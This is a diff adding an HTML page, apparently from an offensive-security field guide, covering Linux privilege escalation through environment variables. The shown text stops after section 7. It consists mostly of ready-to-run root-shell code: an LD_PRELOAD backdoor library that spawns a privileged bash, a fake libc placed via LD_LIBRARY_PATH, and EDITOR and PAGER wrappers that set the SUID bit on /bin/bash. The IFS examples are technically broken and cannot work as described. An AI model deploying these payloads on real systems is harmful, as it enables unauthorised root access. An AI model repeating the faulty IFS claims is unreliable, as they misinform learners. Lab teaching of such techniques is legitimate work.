@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="theme-color" content="#050505">
+  <meta name="description" content="Privilege Escalation part 7 of 10. Review LD_PRELOAD, library paths, shell startup variables and interpreter search paths.">
+  <title>Part 07: Environment Variable Abuse | 0XMAP Privilege Escalation</title>
+  <link rel="icon" href="../static/favicon.svg" type="image/svg+xml">
+  <link rel="stylesheet" href="../static/guide.css">
+</head>
+<body data-root="../">
+  <a class="g-skip" href="#main">Skip to content</a>
+  
+<header class="g-top">
+  <div class="g-top-inner">
+    <a class="g-brand" href="../index.html" aria-label="0XMAP Linux field guide home">
+      <span class="g-mark" aria-hidden="true"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7l4 5-4 5"/><path d="M12 17h8"/></svg></span>
+      <span class="g-brand-text">
+        <span class="g-name">0XMAP</span>
+        <span class="g-sub">Linux field guide</span>
+      </span>
+    </a>
+    <div class="g-top-actions">
+      <nav class="g-top-nav" aria-label="Guide">
+        <a href="../index.html#about">Guide</a>
+        <a href="../index.html#foundations">Foundations</a>
+        <a href="../index.html#privesc">Privilege escalation</a>
+        <a href="../index.html#chapters">Chapters</a>
+      </nav>
+      <button type="button" class="g-search-btn" data-search-open aria-label="Search the guide">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="11" cy="11" r="6.5"/><path d="m16 16 4 4"/></svg>
+        <span>Search</span>
+        <kbd>/</kbd>
+      </button>
+      <span class="g-context-pill">Privilege escalation</span>
+      <button type="button" class="g-menu-btn" data-menu-toggle aria-label="Open chapter menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
+    </div>
+  </div>
+</header>
+  
+<div class="g-doc-layout">
+  
+<aside class="g-sidebar" data-sidebar aria-label="Privilege escalation navigation">
+  <div class="g-sidebar-head">
+    <div>
+      <p class="g-sidebar-kicker">Privilege Escalation</p>
+      <p class="g-sidebar-count">10 parts / practitioner path</p>
+    </div>
+    <button type="button" class="g-side-close" data-menu-close aria-label="Close handbook menu">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 6l12 12M18 6 6 18"/></svg>
+    </button>
+  </div>
+  <nav class="g-side-nav">
+    <section class="g-nav-part">
+      <div class="g-nav-part-head"><span class="g-nav-part-num">PE</span><span>Handbook</span></div>
+      <ol><li><a class="g-nav-link g-nav-link-simple" href="../privesc/01-sudo-misconfigurations.html"><span class="g-nav-num">01</span><span class="g-nav-title">Sudo</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/02-suid-sgid-binaries.html"><span class="g-nav-num">02</span><span class="g-nav-title">SUID and SGID</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/03-linux-capabilities.html"><span class="g-nav-num">03</span><span class="g-nav-title">Capabilities</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/04-cron-jobs.html"><span class="g-nav-num">04</span><span class="g-nav-title">Cron jobs</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/05-writable-system-files.html"><span class="g-nav-num">05</span><span class="g-nav-title">Writable files</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/06-path-hijacking.html"><span class="g-nav-num">06</span><span class="g-nav-title">PATH hijacking</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/07-environment-variable-abuse.html" aria-current="page"><span class="g-nav-num">07</span><span class="g-nav-title">Environment</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/08-kernel-exploits.html"><span class="g-nav-num">08</span><span class="g-nav-title">Kernel</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/09-service-misconfigurations.html"><span class="g-nav-num">09</span><span class="g-nav-title">Services</span></a></li><li><a class="g-nav-link g-nav-link-simple" href="../privesc/10-nfs-misconfigurations.html"><span class="g-nav-num">10</span><span class="g-nav-title">NFS</span></a></li></ol>
+    </section>
+  </nav>
+  <a class="g-side-guide" href="../chapters/26-automating-linux-privilege-escalation-checks.html">
+    <span class="g-side-guide-kicker">Apply it</span>
+    <strong>Chapter 26 / automation</strong>
+    <span>Turn the checks into a repeatable enumeration pass</span>
+  </a>
+  <a class="g-side-guide" href="../index.html#foundations">
+    <span class="g-side-guide-kicker">Companion handbook</span>
+    <strong>Linux Foundations</strong>
+    <span>10 parts from first command to secure baseline</span>
+  </a>
+  <p class="g-sidebar-note">Use these techniques only in labs, CTFs or systems you own and have written permission to test.</p>
+</aside>
+<div class="g-scrim" data-menu-close hidden></div>
+  <main class="g-content" id="main">
+    <article class="g-article">
+      <header class="g-chapter-head">
+        <nav class="g-chapter-crumb" aria-label="Breadcrumb">
+          <a href="../index.html">Field guide</a><span>/</span>
+          <a href="../index.html#privesc">Privilege Escalation</a><span>/</span>
+          <span>Part 07</span>
+        </nav>
+        <p class="g-kicker">Privilege Escalation / Part 07</p>
+        <h1>Environment Variable Abuse</h1>
+        <p class="g-deck">Review LD_PRELOAD, library paths, shell startup variables and interpreter search paths.</p>
+        <div class="g-chapter-meta">
+          <span>19 min read</span>
+          <span>18 sections</span>
+          <span>43 code blocks</span>
+          <span>Part 07 / 10</span>
+        </div>
+      </header>
+      
+<details class="g-toc-mobile">
+  <summary>On this page <span>18 sections</span></summary>
+  <nav aria-label="On this page"><a class="g-toc-link depth-2" href="#environment-variable-abuse-for-privilege-escalation" data-toc-link>Environment Variable Abuse for Privilege Escalation</a><a class="g-toc-link depth-3" href="#1-understanding-environment-variables" data-toc-link>1. Understanding Environment Variables</a><a class="g-toc-link depth-3" href="#2-enumeration-finding-exploitable-variables" data-toc-link>2. Enumeration: Finding Exploitable Variables</a><a class="g-toc-link depth-3" href="#3-ld-preload-exploitation-most-dangerous" data-toc-link>3. LD_PRELOAD Exploitation (Most Dangerous)</a><a class="g-toc-link depth-3" href="#4-ld-library-path-exploitation" data-toc-link>4. LD_LIBRARY_PATH Exploitation</a><a class="g-toc-link depth-3" href="#5-ifs-internal-field-separator-exploitation" data-toc-link>5. IFS (Internal Field Separator) Exploitation</a><a class="g-toc-link depth-3" href="#6-editor-visual-exploitation" data-toc-link>6. EDITOR/VISUAL Exploitation</a><a class="g-toc-link depth-3" href="#7-pager-exploitation" data-toc-link>7. PAGER Exploitation</a><a class="g-toc-link depth-3" href="#8-bash-env-and-env-exploitation" data-toc-link>8. BASH_ENV and ENV Exploitation</a><a class="g-toc-link depth-3" href="#9-python-environment-exploitation" data-toc-link>9. Python Environment Exploitation</a><a class="g-toc-link depth-3" href="#10-perl-environment-exploitation" data-toc-link>10. Perl Environment Exploitation</a><a class="g-toc-link depth-3" href="#11-node-js-environment-exploitation" data-toc-link>11. Node.js Environment Exploitation</a><a class="g-toc-link depth-3" href="#12-ssh-environment-exploitation" data-toc-link>12. SSH Environment Exploitation</a><a class="g-toc-link depth-3" href="#13-tmpdir-exploitation" data-toc-link>13. TMPDIR Exploitation</a><a class="g-toc-link depth-3" href="#14-histfile-manipulation" data-toc-link>14. HISTFILE Manipulation</a><a class="g-toc-link depth-3" href="#15-shell-variable-exploitation" data-toc-link>15. SHELL Variable Exploitation</a><a class="g-toc-link depth-3" href="#16-practical-exploitation-workflow" data-toc-link>16. Practical Exploitation Workflow</a><a class="g-toc-link depth-3" href="#17-defensive-measures" data-toc-link>17. Defensive Measures</a></nav>
+</details>
+      <div class="g-prose"><h2 id="environment-variable-abuse-for-privilege-escalation">Environment Variable Abuse for Privilege Escalation<a aria-label="Link to this section" class="g-anchor" href="#environment-variable-abuse-for-privilege-escalation">#</a></h2>
+<p>Environment variables are dynamic values that influence the behavior of processes. When privileged programs (root-owned processes, SUID binaries, or cron jobs) rely on unsanitized environment variables, attackers can manipulate them to execute arbitrary code with elevated privileges.</p>
+<hr/>
+<h3 id="1-understanding-environment-variables">1. Understanding Environment Variables<a aria-label="Link to this section" class="g-anchor" href="#1-understanding-environment-variables">#</a></h3>
+<p><strong>What Are Environment Variables?</strong></p>
+<ul>
+<li>Key-value pairs that affect process behavior</li>
+<li>Inherited from parent process to child processes</li>
+<li>Can be set system-wide or per-user</li>
+<li>Critical for many system operations</li>
+</ul>
+<p><strong>Common Environment Variables</strong>:</p>
+<div class="g-table-wrap"><table class="g-table">
+<thead>
+<tr>
+<th>Variable</th>
+<th>Purpose</th>
+<th>Exploitation Risk</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>PATH</code></td>
+<td>Executable search paths</td>
+<td>High - command hijacking</td>
+</tr>
+<tr>
+<td><code>LD_PRELOAD</code></td>
+<td>Preload shared libraries</td>
+<td>Very High - code injection</td>
+</tr>
+<tr>
+<td><code>LD_LIBRARY_PATH</code></td>
+<td>Additional library search paths</td>
+<td>High - library hijacking</td>
+</tr>
+<tr>
+<td><code>IFS</code></td>
+<td>Internal Field Separator</td>
+<td>Medium - command parsing</td>
+</tr>
+<tr>
+<td><code>EDITOR</code>/<code>VISUAL</code></td>
+<td>Default text editor</td>
+<td>High - file overwrite</td>
+</tr>
+<tr>
+<td><code>PAGER</code></td>
+<td>Default pager</td>
+<td>Medium - command execution</td>
+</tr>
+<tr>
+<td><code>TMPDIR</code></td>
+<td>Temporary directory</td>
+<td>Low-Medium - file manipulation</td>
+</tr>
+<tr>
+<td><code>BASH_ENV</code></td>
+<td>Bash initialization file</td>
+<td>High - arbitrary code execution</td>
+</tr>
+<tr>
+<td><code>ENV</code></td>
+<td>Shell initialization (POSIX)</td>
+<td>High - arbitrary code execution</td>
+</tr>
+<tr>
+<td><code>SHELL</code></td>
+<td>Default shell</td>
+<td>Medium - command execution</td>
+</tr>
+<tr>
+<td><code>HOME</code></td>
+<td>Home directory</td>
+<td>Medium - file read/write</td>
+</tr>
+<tr>
+<td><code>HISTFILE</code></td>
+<td>Command history file</td>
+<td>Low - log tampering</td>
+</tr>
+<tr>
+<td><code>PYTHONPATH</code></td>
+<td>Python module search path</td>
+<td>High - module hijacking</td>
+</tr>
+<tr>
+<td><code>PERL5LIB</code></td>
+<td>Perl module search path</td>
+<td>High - module hijacking</td>
+</tr>
+<tr>
+<td><code>NODE_PATH</code></td>
+<td>Node.js module search path</td>
+<td>High - module hijacking</td>
+</tr>
+<tr>
+<td><code>LD_DEBUG</code></td>
+<td>Dynamic linker debugging</td>
+<td>Low - information leak</td>
+</tr>
+<tr>
+<td><code>RES_OPTIONS</code></td>
+<td>Resolver options</td>
+<td>Medium - DNS hijacking</td>
+</tr>
+</tbody>
+</table></div>
+<hr/>
+<h3 id="2-enumeration-finding-exploitable-variables">2. Enumeration: Finding Exploitable Variables<a aria-label="Link to this section" class="g-anchor" href="#2-enumeration-finding-exploitable-variables">#</a></h3>
+<p><strong>Check Current Environment</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash">printenv
+<span class="c1"># Or</span>
+env
+
+<span class="c1"># View specific variables</span>
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$PATH</span>
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$LD_PRELOAD</span>
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$LD_LIBRARY_PATH</span>
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$IFS</span>
+<span class="nb">echo</span><span class="w"> </span><span class="nv">$EDITOR</span>
+</code></pre></div>
+<p><strong>Check Variables Inherited by Privileged Processes</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check root's environment (if you can read /proc)</span>
+cat<span class="w"> </span>/proc/1/environ<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">'\0'</span><span class="w"> </span><span class="s1">'\n'</span>
+cat<span class="w"> </span>/proc/*/environ<span class="w"> </span><span class="p">|</span><span class="w"> </span>tr<span class="w"> </span><span class="s1">'\0'</span><span class="w"> </span><span class="s1">'\n'</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>sort<span class="w"> </span>-u
+
+<span class="c1"># Check cron's environment</span>
+cat<span class="w"> </span>/etc/crontab<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"env\|path"</span>
+cat<span class="w"> </span>/var/spool/cron/crontabs/*<span class="w"> </span><span class="m">2</span>&gt;/dev/null<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"env\|path"</span>
+
+<span class="c1"># Check sudo environment</span>
+sudo<span class="w"> </span>-l<span class="w">  </span><span class="c1"># Shows environment variables preserved</span>
+<span class="c1"># Look for "env_keep" settings</span>
+</code></pre></div>
+<p><strong>Check SUID Binary Environment Handling</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Run SUID binary with strace to see environment</span>
+strace<span class="w"> </span>-e<span class="w"> </span><span class="nv">trace</span><span class="o">=</span>execve<span class="w"> </span>/usr/bin/passwd<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>execve
+
+<span class="c1"># Check which variables are preserved</span>
+strings<span class="w"> </span>/usr/bin/suid_binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s2">"^[A-Z_]+</span>$<span class="s2">"</span>
+</code></pre></div>
+<p><strong>Find Writable Environment Files</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># System-wide environment files</span>
+find<span class="w"> </span>/etc<span class="w"> </span>-name<span class="w"> </span><span class="s2">"environment"</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">"profile"</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">"bash.bashrc"</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">"*.sh"</span><span class="w"> </span>-path<span class="w"> </span><span class="s2">"*/profile.d/*"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+
+<span class="c1"># User environment files</span>
+find<span class="w"> </span>/home<span class="w"> </span>-name<span class="w"> </span><span class="s2">".bashrc"</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">".profile"</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">".bash_profile"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+find<span class="w"> </span>/root<span class="w"> </span>-name<span class="w"> </span><span class="s2">".bashrc"</span><span class="w"> </span>-o<span class="w"> </span>-name<span class="w"> </span><span class="s2">".profile"</span><span class="w"> </span><span class="m">2</span>&gt;/dev/null
+</code></pre></div>
+<p><strong>Automated Tools</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># LinPEAS environment checks</span>
+./linpeas.sh<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-A<span class="w"> </span><span class="m">10</span><span class="w"> </span><span class="s2">"Environment"</span>
+
+<span class="c1"># Manual comprehensive check</span>
+<span class="k">for</span><span class="w"> </span>var<span class="w"> </span><span class="k">in</span><span class="w"> </span>PATH<span class="w"> </span>LD_PRELOAD<span class="w"> </span>LD_LIBRARY_PATH<span class="w"> </span>IFS<span class="w"> </span>EDITOR<span class="w"> </span>VISUAL<span class="w"> </span>PAGER<span class="w"> </span>BASH_ENV<span class="w"> </span>SHELL<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">    </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"</span><span class="nv">$var</span><span class="s2"> = </span><span class="si">${</span><span class="p">!var</span><span class="si">}</span><span class="s2">"</span>
+<span class="k">done</span>
+</code></pre></div>
+<hr/>
+<h3 id="3-ld-preload-exploitation-most-dangerous">3. LD_PRELOAD Exploitation (Most Dangerous)<a aria-label="Link to this section" class="g-anchor" href="#3-ld-preload-exploitation-most-dangerous">#</a></h3>
+<p><code>LD_PRELOAD</code> loads a shared library <strong>before</strong> any other libraries. This allows overriding any function.</p>
+<h4 id="a-direct-ld-preload-on-suid-binaries">A. Direct LD_PRELOAD on SUID Binaries<a aria-label="Link to this section" class="g-anchor" href="#a-direct-ld-preload-on-suid-binaries">#</a></h4>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create malicious shared library</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/backdoor.c<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#include &lt;stdio.h&gt;</span>
+<span class="s">#include &lt;stdlib.h&gt;</span>
+<span class="s">#include &lt;unistd.h&gt;</span>
+
+<span class="s">// Constructor runs when library is loaded</span>
+<span class="s">__attribute__((constructor))</span>
+<span class="s">void init() {</span>
+<span class="s">    // Drop root privileges? No, we want to keep them</span>
+<span class="s">    setuid(0);</span>
+<span class="s">    setgid(0);</span>
+<span class="s">    system("/bin/bash -p");</span>
+<span class="s">}</span>
+
+<span class="s">// Override a common function (e.g., getuid)</span>
+<span class="s">int getuid() {</span>
+<span class="s">    return 0; // Always return root</span>
+<span class="s">}</span>
+<span class="s">EOF</span>
+
+<span class="c1"># 2. Compile as shared library</span>
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>/tmp/backdoor.c<span class="w"> </span>-o<span class="w"> </span>/tmp/backdoor.so
+
+<span class="c1"># 3. Execute SUID binary with LD_PRELOAD</span>
+<span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/backdoor.so<span class="w"> </span>/usr/bin/passwd
+<span class="c1"># This might not work if the binary sanitizes LD_PRELOAD</span>
+</code></pre></div>
+<p><strong>Why It Might Not Work</strong>: Modern SUID binaries <strong>drop environment variables</strong> for security.</p>
+<h4 id="b-ld-preload-via-sudo-env-keep">B. LD_PRELOAD via sudo env_keep<a aria-label="Link to this section" class="g-anchor" href="#b-ld-preload-via-sudo-env-keep">#</a></h4>
+<p>If <code>sudo</code> preserves LD_PRELOAD, this is a direct root shell.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check if LD_PRELOAD is in env_keep</span>
+sudo<span class="w"> </span>-l<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>env_keep<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>LD_PRELOAD
+
+<span class="c1"># If present:</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/backdoor.so
+sudo<span class="w"> </span>/bin/true<span class="w">  </span><span class="c1"># Any command, library loads as root</span>
+</code></pre></div>
+<p><strong>Finding env_keep</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Check sudo configuration</span>
+cat<span class="w"> </span>/etc/sudoers<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>env_keep
+cat<span class="w"> </span>/etc/sudoers.d/*<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>env_keep
+
+<span class="c1"># Look for: env_keep += "LD_PRELOAD"</span>
+</code></pre></div>
+<h4 id="c-ld-preload-in-cron-environment">C. LD_PRELOAD in Cron Environment<a aria-label="Link to this section" class="g-anchor" href="#c-ld-preload-in-cron-environment">#</a></h4>
+<p>If cron's environment includes LD_PRELOAD, every cron job will load your library.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Add to cron environment (if writable)</span>
+<span class="c1"># /etc/crontab:</span>
+<span class="nv">LD_PRELOAD</span><span class="o">=</span>/tmp/backdoor.so
+*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>*<span class="w"> </span>root<span class="w"> </span>/bin/true
+
+<span class="c1"># Or add to user crontab (if you can)</span>
+crontab<span class="w"> </span>-e
+<span class="c1"># Add: LD_PRELOAD=/tmp/backdoor.so</span>
+</code></pre></div>
+<hr/>
+<h3 id="4-ld-library-path-exploitation">4. LD_LIBRARY_PATH Exploitation<a aria-label="Link to this section" class="g-anchor" href="#4-ld-library-path-exploitation">#</a></h3>
+<p><code>LD_LIBRARY_PATH</code> adds directories to the library search path.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Find which libraries a SUID binary uses</span>
+ldd<span class="w"> </span>/usr/bin/passwd
+<span class="c1"># Output: libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6</span>
+
+<span class="c1"># 2. Create a directory with a fake library</span>
+mkdir<span class="w"> </span>/tmp/fake_lib
+gcc<span class="w"> </span>-shared<span class="w"> </span>-fPIC<span class="w"> </span>-o<span class="w"> </span>/tmp/fake_lib/libc.so.6<span class="w"> </span>backdoor.c
+
+<span class="c1"># 3. Set LD_LIBRARY_PATH</span>
+<span class="nv">LD_LIBRARY_PATH</span><span class="o">=</span>/tmp/fake_lib<span class="w"> </span>/usr/bin/passwd
+
+<span class="c1"># 4. The binary loads your libc instead of system libc</span>
+<span class="c1"># This gives complete control</span>
+</code></pre></div>
+<p><strong>Limitation</strong>: SUID binaries drop LD_LIBRARY_PATH (same as LD_PRELOAD).</p>
+<p><strong>Bypass</strong>: If binary is <strong>SGID</strong> instead of SUID, some systems still honor LD_LIBRARY_PATH.</p>
+<hr/>
+<h3 id="5-ifs-internal-field-separator-exploitation">5. IFS (Internal Field Separator) Exploitation<a aria-label="Link to this section" class="g-anchor" href="#5-ifs-internal-field-separator-exploitation">#</a></h3>
+<p><code>IFS</code> determines how the shell splits words. Manipulating it can change command parsing.</p>
+<p><strong>Vulnerable Script</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="ch">#!/bin/bash</span>
+<span class="c1"># /usr/local/bin/backup.sh</span>
+<span class="nv">BACKUP_DIR</span><span class="o">=</span><span class="s2">"/backup"</span>
+<span class="nv">FILE</span><span class="o">=</span><span class="s2">"data"</span>
+cp<span class="w"> </span><span class="nv">$BACKUP_DIR</span>/<span class="nv">$FILE</span><span class="w"> </span>/tmp/<span class="w">  </span><span class="c1"># No quotes!</span>
+</code></pre></div>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create malicious directory</span>
+mkdir<span class="w"> </span><span class="s2">"/backup/data"</span>
+<span class="nb">echo</span><span class="w"> </span><span class="s1">'cp /bin/bash /tmp/shell; chmod +s /tmp/shell'</span><span class="w"> </span>&gt;<span class="w"> </span><span class="s2">"/backup/data/x"</span>
+
+<span class="c1"># 2. Set IFS to "/" so directory separators are ignored</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span><span class="s1">'/'</span>
+
+<span class="c1"># 3. Run the script (as root)</span>
+/usr/local/bin/backup.sh
+<span class="c1"># The command becomes: cp backup data /tmp/ (completely different!)</span>
+</code></pre></div>
+<p><strong>Alternative IFS Exploit</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># Script: echo "User: $(whoami)"</span>
+<span class="c1"># Set IFS to: \n (newline)</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">IFS</span><span class="o">=</span><span class="s1">$'\n'</span>
+<span class="c1"># The command becomes: echo User: root (if executed as root)</span>
+</code></pre></div>
+<hr/>
+<h3 id="6-editor-visual-exploitation">6. EDITOR/VISUAL Exploitation<a aria-label="Link to this section" class="g-anchor" href="#6-editor-visual-exploitation">#</a></h3>
+<p>If root uses these variables to open a file, the editor can be hijacked.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create malicious editor wrapper</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/editor.sh<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s"># Execute backdoor, then open real editor</span>
+<span class="s">chmod +s /bin/bash</span>
+<span class="s">/usr/bin/vim "$@"</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/editor.sh
+
+<span class="c1"># 2. Set EDITOR variable</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">EDITOR</span><span class="o">=</span>/tmp/editor.sh
+<span class="nb">export</span><span class="w"> </span><span class="nv">VISUAL</span><span class="o">=</span>/tmp/editor.sh
+
+<span class="c1"># 3. Trigger root's editor usage</span>
+<span class="c1"># sudo crontab -e  (if root uses your editor)</span>
+<span class="c1"># sudo visudo  (if uses your editor)</span>
+</code></pre></div>
+<p><strong>Common Exploitation Points</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># sudoedit (sudo -e) - opens files as root</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">EDITOR</span><span class="o">=</span>/tmp/editor.sh
+sudo<span class="w"> </span>-e<span class="w"> </span>/etc/hosts<span class="w">  </span><span class="c1"># Your editor runs as root</span>
+
+<span class="c1"># crontab -e (as root)</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">EDITOR</span><span class="o">=</span>/tmp/editor.sh
+sudo<span class="w"> </span>crontab<span class="w"> </span>-e
+
+<span class="c1"># Git commits (if used by root)</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">EDITOR</span><span class="o">=</span>/tmp/editor.sh
+sudo<span class="w"> </span>git<span class="w"> </span>commit<span class="w"> </span>--amend
+</code></pre></div>
+<hr/>
+<h3 id="7-pager-exploitation">7. PAGER Exploitation<a aria-label="Link to this section" class="g-anchor" href="#7-pager-exploitation">#</a></h3>
+<p>Some commands use <code>PAGER</code> to display output. If root runs such commands, you can hijack.</p>
+<p><strong>Exploitation</strong>:</p>
+<div class="g-code"><div class="g-code-bar"><span class="g-code-lang">bash</span><button aria-label="Copy code block" class="g-copy" data-copy-code="" type="button">Copy</button></div><pre tabindex="0"><code class="g-code-body language-bash"><span class="c1"># 1. Create malicious pager</span>
+cat<span class="w"> </span>&gt;<span class="w"> </span>/tmp/pager.sh<span class="w"> </span><span class="s">&lt;&lt; 'EOF'</span>
+<span class="s">#!/bin/bash</span>
+<span class="s">chmod +s /bin/bash</span>
+<span class="s"># Show actual output using less</span>
+<span class="s">/usr/bin/less "$@"</span>
+<span class="s">EOF</span>
+chmod<span class="w"> </span>+x<span class="w"> </span>/tmp/pager.sh
+
+<span class="c1"># 2. Set PAGER variable</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">PAGER</span><span class="o">=</span>/tmp/pager.sh
+
+<span class="c1"># 3. Trigger root command that uses PAGER</span>
+<span class="c1"># Example: systemctl status service</span>
+sudo<span class="w"> </span>systemctl<span class="w"> </span>status<span class="w"> </span>sshd<span class="w">  </span><span class="c1"># Might use PAGER</span>
+
+<span class="c1"># Example: man pages (if root runs man)</span>
+sudo<span class="w"> </span>man<span class="w"> </span>ls
+</code></pre></div>
+<hr/>
